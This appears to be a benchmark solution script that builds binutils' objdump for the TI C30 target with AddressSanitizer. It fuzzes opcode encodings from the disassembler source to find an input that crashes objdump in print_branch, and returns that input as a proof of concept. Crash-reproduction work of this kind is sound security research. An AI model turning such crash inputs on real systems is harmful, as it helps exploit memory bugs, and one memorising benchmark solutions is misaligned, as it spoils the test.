import os
import sys
import tarfile
import subprocess
import shutil
import re
import struct
import random

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Define workspace paths
        base_dir = os.getcwd()
        work_dir = os.path.join(base_dir, "workspace_tic30")
        if os.path.exists(work_dir):
            try:
                shutil.rmtree(work_dir)
            except OSError:
                pass
        os.makedirs(work_dir)
        
        try:
            # Extract source
            with tarfile.open(src_path) as tar:
                tar.extractall(path=work_dir)
            
            # Find source root
            src_root = work_dir
            for root, dirs, files in os.walk(work_dir):
                if "configure" in files:
                    src_root = root
                    break
            
            # Build directory
            build_dir = os.path.join(work_dir, "build")
            os.makedirs(build_dir)
            
            # Environment variables for ASAN
            env = os.environ.copy()
            env["CFLAGS"] = "-g -O0 -fsanitize=address"
            env["LDFLAGS"] = "-fsanitize=address"
            env["MAKEINFO"] = "true"
            env["CC"] = "gcc"
            env["CXX"] = "g++"
            
            # Configure
            subprocess.run(
                [
                    os.path.join(src_root, "configure"),
                    "--target=tic30-coff",
                    "--disable-nls",
                    "--disable-werror",
                    "--disable-gdb",
                    "--disable-sim",
                    "--disable-libdecnumber",
                    "--disable-readline"
                ],
                cwd=build_dir,
                env=env,
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Build
            subprocess.run(
                ["make", "-j8", "all-opcodes", "all-binutils"],
                cwd=build_dir,
                env=env,
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Find objdump
            objdump_bin = None
            for root, dirs, files in os.walk(build_dir):
                if "objdump" in files:
                    path = os.path.join(root, "objdump")
                    if os.access(path, os.X_OK):
                        objdump_bin = path
                        break
            
            if not objdump_bin:
                # Fallback to standard location
                path = os.path.join(build_dir, "binutils", "objdump")
                if os.access(path, os.X_OK):
                    objdump_bin = path
            
            if not objdump_bin:
                return b""

            # Parse templates from tic30-dis.c
            templates = []
            tic30_dis_path = None
            for root, dirs, files in os.walk(src_root):
                if "tic30-dis.c" in files:
                    tic30_dis_path = os.path.join(root, "tic30-dis.c")
                    break
            
            if tic30_dis_path:
                with open(tic30_dis_path, 'r', errors='ignore') as f:
                    content = f.read()
                    # Regex to capture opcode definitions: { "name", operands, opcode, mask
                    matches = re.findall(r'\{\s*"([^"]+)"\s*,[^,]*,\s*(0x[0-9A-Fa-f]+)\s*,\s*(0x[0-9A-Fa-f]+)', content)
                    for name, opcode, mask in matches:
                        templates.append((name, int(opcode, 16), int(mask, 16)))
            
            if not templates:
                # Fallback template if parsing fails
                templates = [("br", 0x60000000, 0xFF000000)]

            # Fuzzing strategy
            # Prioritize branch instructions as vulnerability is in print_branch
            branches = [t for t in templates if "br" in t[0] or "call" in t[0] or t[0].startswith("b")]
            others = [t for t in templates if t not in branches]
            
            poc_path = os.path.join(work_dir, "poc.bin")
            
            # We iterate through templates, generating variations for wildcard bits
            for name, opcode, mask in branches + others:
                wildcard = (~mask) & 0xFFFFFFFF
                
                # Test candidates:
                # 1. Base opcode (wildcards 0)
                # 2. All wildcards set to 1
                # 3. Random variations
                candidates = [opcode, opcode | wildcard]
                for _ in range(15):
                    candidates.append(opcode | (random.getrandbits(32) & wildcard))
                
                for val in candidates:
                    # Try both Big and Little Endian
                    for fmt in ['>I', '<I']:
                        data = struct.pack(fmt, val)
                        
                        with open(poc_path, 'wb') as f:
                            f.write(data)
                        
                        try:
                            # Run objdump with raw binary input mode for tic30
                            proc = subprocess.run(
                                [objdump_bin, "-D", "-b", "binary", "-m", "tic30", poc_path],
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                timeout=0.5
                            )
                            
                            # Check for crash
                            if proc.returncode != 0:
                                err_out = proc.stderr.lower()
                                if b"addresssanitizer" in err_out or b"segmentation fault" in err_out or proc.returncode < 0:
                                    try:
                                        shutil.rmtree(work_dir)
                                    except:
                                        pass
                                    return data
                        except subprocess.TimeoutExpired:
                            pass
                            
        except Exception as e:
            pass
        finally:
            if os.path.exists(work_dir):
                try:
                    shutil.rmtree(work_dir)
                except:
                    pass

        return b""
